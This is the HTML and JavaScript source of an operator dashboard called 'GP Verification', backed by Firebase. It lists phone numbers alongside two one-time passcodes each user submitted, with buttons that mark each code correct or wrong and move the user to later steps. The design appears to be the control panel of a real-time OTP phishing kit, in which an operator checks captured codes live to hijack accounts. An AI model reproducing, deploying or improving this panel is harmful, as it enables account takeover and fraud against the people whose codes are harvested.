<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - GP Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #f0f2f5;
            padding: 20px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        header {
            background: linear-gradient(135deg, #3498db, #2980b9);
            color: white;
            padding: 25px;
            border-radius: 15px;
            margin-bottom: 30px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        header h1 {
            font-size: 28px;
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        header h1 span {
            font-size: 16px;
            background: rgba(255,255,255,0.2);
            padding: 5px 12px;
            border-radius: 20px;
            margin-left: 15px;
            font-weight: normal;
        }

        .refresh-btn {
            background: rgba(255,255,255,0.2);
            border: 1px solid rgba(255,255,255,0.3);
            color: white;
            padding: 10px 20px;
            border-radius: 10px;
            cursor: pointer;
            font-size: 15px;
            font-weight: 500;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .refresh-btn:hover {
            background: rgba(255,255,255,0.3);
            transform: translateY(-2px);
        }

        .stats-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: white;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
            border-left: 4px solid #3498db;
        }

        .stat-card h3 {
            color: #666;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .stat-card .number {
            font-size: 32px;
            font-weight: 700;
            color: #2c3e50;
        }

        .stat-card .number span {
            font-size: 16px;
            color: #7f8c8d;
            font-weight: 400;
            margin-left: 8px;
        }

        .requests-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 20px;
        }

        .request-card {
            background: white;
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            border: 1px solid #eef2f6;
        }

        .request-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
        }

        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 2px solid #f0f2f5;
        }

        .phone-number {
            font-size: 22px;
            font-weight: 700;
            color: #2c3e50;
            letter-spacing: 0.5px;
        }

        .status-badge {
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .status-pending_number { background: #fff3cd; color: #856404; }
        .status-pending_otp1 { background: #cce5ff; color: #004085; }
        .status-in_moments { background: #d4edda; color: #155724; }
        .status-pending_otp2 { background: #d1ecf1; color: #0c5460; }

        .otp-display {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 12px;
            margin-bottom: 15px;
        }

        .otp-row {
            display: flex;
            align-items: center;
            margin-bottom: 8px;
        }

        .otp-row:last-child {
            margin-bottom: 0;
        }

        .otp-label {
            width: 60px;
            font-size: 14px;
            color: #7f8c8d;
            font-weight: 500;
        }

        .otp-value {
            font-size: 24px;
            font-weight: 700;
            color: #2c3e50;
            letter-spacing: 4px;
            background: white;
            padding: 5px 15px;
            border-radius: 8px;
            border: 1px solid #e0e0e0;
            font-family: monospace;
        }

        .otp-value.empty {
            color: #aaa;
            font-size: 18px;
            letter-spacing: 2px;
        }

        .action-buttons {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 15px;
        }

        .action-btn {
            flex: 1;
            min-width: 80px;
            padding: 12px 8px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .action-btn.approve { background: #4CAF50; color: white; }
        .action-btn.approve:hover { background: #45a049; transform: scale(1.02); }

        .action-btn.correct { background: #4CAF50; color: white; }
        .action-btn.correct:hover { background: #45a049; transform: scale(1.02); }

        .action-btn.wrong { background: #ff4444; color: white; }
        .action-btn.wrong:hover { background: #ff3333; transform: scale(1.02); }

        .action-btn.complete { background: #4CAF50; color: white; }
        .action-btn.complete:hover { background: #45a049; transform: scale(1.02); }

        .action-btn.fail { background: #ff4444; color: white; }
        .action-btn.fail:hover { background: #ff3333; transform: scale(1.02); }

        .action-btn.next { background: #3498db; color: white; }
        .action-btn.next:hover { background: #2980b9; transform: scale(1.02); }

        .action-btn.yes { background: #4CAF50; color: white; }
        .action-btn.yes:hover { background: #45a049; transform: scale(1.02); }

        .action-btn.no { background: #ff4444; color: white; }
        .action-btn.no:hover { background: #ff3333; transform: scale(1.02); }

        .timestamp {
            margin-top: 15px;
            font-size: 11px;
            color: #95a5a6;
            text-align: right;
            border-top: 1px solid #ecf0f1;
            padding-top: 10px;
        }

        .no-requests {
            grid-column: 1 / -1;
            text-align: center;
            padding: 60px;
            background: white;
            border-radius: 15px;
            color: #7f8c8d;
            font-size: 16px;
        }

        .loading {
            text-align: center;
            padding: 50px;
            font-size: 18px;
            color: #666;
        }

        .loading-spinner {
            display: inline-block;
            width: 40px;
            height: 40px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>
                Admin Control Panel 
                <span>GP Verification</span>
            </h1>
            <button class="refresh-btn" onclick="loadRequests()">
                <span>🔄</span> Refresh Data
            </button>
        </header>

        <div class="stats-container" id="statsContainer">
            <div class="stat-card">
                <h3>Total Requests</h3>
                <div class="number" id="totalRequests">0</div>
            </div>
            <div class="stat-card">
                <h3>Pending Number</h3>
                <div class="number" id="pendingNumberCount">0</div>
            </div>
            <div class="stat-card">
                <h3>Pending OTP 1</h3>
                <div class="number" id="pendingOtp1Count">0</div>
            </div>
            <div class="stat-card">
                <h3>In Moments</h3>
                <div class="number" id="inMomentsCount">0</div>
            </div>
            <div class="stat-card">
                <h3>Pending OTP 2</h3>
                <div class="number" id="pendingOtp2Count">0</div>
            </div>
        </div>

        <div class="requests-grid" id="requestsGrid">
            <div class="loading">
                <div class="loading-spinner"></div>
                <div>Loading requests...</div>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-app.js";
        import { getDatabase, ref, onValue, set, get } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBuPWP1rrQvvJI4kETUjXjlbT3-tkjOlT8",
            authDomain: "gp-verification.firebaseapp.com",
            databaseURL: "https://gp-verification-default-rtdb.firebaseio.com",
            projectId: "gp-verification",
            storageBucket: "gp-verification.firebasestorage.app",
            messagingSenderId: "67589473309",
            appId: "1:67589473309:web:64ed7b39646e2d5a3332f4"
        };

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);

        // Load all requests
        window.loadRequests = function() {
            const requestsRef = ref(database, 'requests');
            
            onValue(requestsRef, (snapshot) => {
                const data = snapshot.val();
                displayRequests(data);
                updateStats(data);
            }, (error) => {
                console.error("Error loading requests:", error);
                document.getElementById('requestsGrid').innerHTML = `
                    <div class="no-requests" style="color: #ff4444;">
                        Error loading requests. Please refresh.
                    </div>
                `;
            });
        };

        // Update status for a user
        window.updateUserStatus = async function(phoneNumber, newStatus, additionalData = {}) {
            const userRef = ref(database, `requests/${phoneNumber}`);
            
            try {
                // Get current data first
                const snapshot = await get(userRef);
                const currentData = snapshot.val() || {};
                
                // Update with new status
                await set(userRef, {
                    ...currentData,
                    ...additionalData,
                    status: newStatus,
                    lastUpdated: new Date().toISOString()
                });
                
                console.log(`Updated ${phoneNumber} to status: ${newStatus}`);
            } catch (error) {
                console.error("Error updating status:", error);
                alert("Failed to update status. Check console for details.");
            }
        };

        function displayRequests(data) {
            const grid = document.getElementById('requestsGrid');
            
            if (!data) {
                grid.innerHTML = '<div class="no-requests">No active requests found.</div>';
                return;
            }

            const requests = Object.entries(data)
                .filter(([_, request]) => request && request.status)
                .sort((a, b) => {
                    // Sort by timestamp (newest first)
                    const timeA = a[1].timestamp || 0;
                    const timeB = b[1].timestamp || 0;
                    return timeB - timeA;
                });

            if (requests.length === 0) {
                grid.innerHTML = '<div class="no-requests">No active requests found.</div>';
                return;
            }

            let html = '';
            
            requests.forEach(([phoneNumber, request]) => {
                const status = request.status || 'unknown';
                const timestamp = request.lastUpdated ? new Date(request.lastUpdated).toLocaleString() : 'Unknown';
                const otp1 = request.otp1 || '';
                const otp2 = request.otp2 || '';
                
                let actionButtons = '';
                
                // Generate buttons based on status
                switch(status) {
                    case 'pending_number':
                        actionButtons = `
                            <button class="action-btn approve" onclick="updateUserStatus('${phoneNumber}', 'approved_number')">
                                Approve Number
                            </button>
                        `;
                        break;
                        
                    case 'pending_otp1':
                        actionButtons = `
                            <button class="action-btn correct" onclick="updateUserStatus('${phoneNumber}', 'approved_otp1')">
                                ✓ Correct
                            </button>
                            <button class="action-btn wrong" onclick="updateUserStatus('${phoneNumber}', 'otp1_error')">
                                ✗ Wrong
                            </button>
                        `;
                        break;
                        
                    case 'in_moments':
                        actionButtons = `
                            <button class="action-btn complete" onclick="updateUserStatus('${phoneNumber}', 'direct_success')">
                                ✓ Complete
                            </button>
                            <button class="action-btn fail" onclick="updateUserStatus('${phoneNumber}', 'failed')">
                                ✗ Fail
                            </button>
                            <button class="action-btn next" onclick="updateUserStatus('${phoneNumber}', 'go_to_p4')">
                                Next
                            </button>
                        `;
                        break;
                        
                    case 'pending_otp2':
                        actionButtons = `
                            <button class="action-btn yes" onclick="updateUserStatus('${phoneNumber}', 'approved_otp2')">
                                ✓ Yes
                            </button>
                            <button class="action-btn no" onclick="updateUserStatus('${phoneNumber}', 'otp2_error')">
                                ✗ No
                            </button>
                        `;
                        break;
                        
                    default:
                        actionButtons = `
                            <button class="action-btn approve" onclick="updateUserStatus('${phoneNumber}', 'approved_number')">
                                Reset to Number
                            </button>
                        `;
                }
                
                html += `
                    <div class="request-card">
                        <div class="card-header">
                            <span class="phone-number">${phoneNumber}</span>
                            <span class="status-badge status-${status}">${status.replace('_', ' ').toUpperCase()}</span>
                        </div>
                        
                        <div class="otp-display">
                            <div class="otp-row">
                                <span class="otp-label">OTP 1:</span>
                                <span class="otp-value ${!otp1 ? 'empty' : ''}">${otp1 || '----'}</span>
                            </div>
                            <div class="otp-row">
                                <span class="otp-label">OTP 2:</span>
                                <span class="otp-value ${!otp2 ? 'empty' : ''}">${otp2 || '----'}</span>
                            </div>
                        </div>
                        
                        <div class="action-buttons">
                            ${actionButtons}
                        </div>
                        
                        <div class="timestamp">
                            Last updated: ${timestamp}
                        </div>
                    </div>
                `;
            });
            
            grid.innerHTML = html;
        }

        function updateStats(data) {
            if (!data) {
                document.getElementById('totalRequests').textContent = '0';
                document.getElementById('pendingNumberCount').textContent = '0';
                document.getElementById('pendingOtp1Count').textContent = '0';
                document.getElementById('inMomentsCount').textContent = '0';
                document.getElementById('pendingOtp2Count').textContent = '0';
                return;
            }

            const requests = Object.values(data).filter(r => r && r.status);
            const total = requests.length;
            
            const pendingNumber = requests.filter(r => r.status === 'pending_number').length;
            const pendingOtp1 = requests.filter(r => r.status === 'pending_otp1').length;
            const inMoments = requests.filter(r => r.status === 'in_moments').length;
            const pendingOtp2 = requests.filter(r => r.status === 'pending_otp2').length;

            document.getElementById('totalRequests').textContent = total;
            document.getElementById('pendingNumberCount').textContent = pendingNumber;
            document.getElementById('pendingOtp1Count').textContent = pendingOtp1;
            document.getElementById('inMomentsCount').textContent = inMoments;
            document.getElementById('pendingOtp2Count').textContent = pendingOtp2;
        }

        // Auto-refresh every 10 seconds
        setInterval(() => {
            window.loadRequests();
        }, 10000);

        // Load initial data
        window.loadRequests();
    </script>
</body>
</html>
